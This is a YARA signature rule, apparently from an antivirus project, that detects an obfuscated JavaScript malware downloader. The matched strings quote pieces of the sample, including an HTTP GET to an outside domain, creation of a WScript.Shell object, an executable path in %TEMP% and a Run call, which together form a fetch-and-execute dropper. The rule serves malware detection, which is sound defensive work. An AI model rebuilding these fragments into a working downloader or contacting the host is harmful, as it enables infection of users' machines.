rule sig_20160401_cbd7b96fa24e7f45a15a81e554ca8aab {
  meta:
    description = "datamaliciousorder - file 20160401_cbd7b96fa24e7f45a15a81e554ca8aab.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8b87b25d9fb2516cd01000c058f3843424e22aee28aefefdcaa2a3286e626b8b"

  strings:
    $s1  = "DniTwq[FuxGrz](\"G\" + \"ET\", \"http://hotlinehomeappalinces.com/l2osa\", false);" fullword ascii
    $s2  = "var YwoIvw = function NnXae() {return WScript[GhtRw](\"WScript\"+\".Shell\");}(), QdTqm = 11;" fullword ascii
    $s3  = "function AeXb(JrfEtl, LufPb){HvzMqc = HvzMqc * 1; return JrfEtl - LufPb;};" fullword ascii
    $s4  = "if (DniTwq[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function RcnNrj() {return YwoIvw[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Cd5TzAdw.ex\" + \"e\";};" fullword ascii
    $s6  = "function FmUt() {return ((MupFig == true) && (MupFig == IeZh)) ? 1 : HvzMqc;};" fullword ascii
    $s7  = "var MupFig = false;" fullword ascii
    $s8  = "function TkdPo()" fullword ascii
    $s9  = "}while (SiyUr);" fullword ascii
    $s10 = "MupFig = true; " fullword ascii
    $s11 = "var IeZh = false;" fullword ascii
    $s12 = "var WngIen = false;" fullword ascii
    $s13 = "function YynIkw(VwuPh) {var NeWvt = (1, 2, 3, 4, 5, VwuPh); return NeWvt;};" fullword ascii
    $s14 = "function AcaBfc(){return BkyJbf + \"\";};" fullword ascii
    $s15 = "function KeuSbd(JfLxp){YwoIvw[\"R\"+\"un\"](JfLxp, HvzMqc, HvzMqc);};" fullword ascii
    $s16 = "IeZh = true; " fullword ascii
    $s17 = "return AeXb(JigLv, RdYre);" fullword ascii
    $s18 = "function CzArc(){return 23;};" fullword ascii
    $s19 = "function TnsOg(){return GhtRw;};" fullword ascii
    $s20 = "var IjAal = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}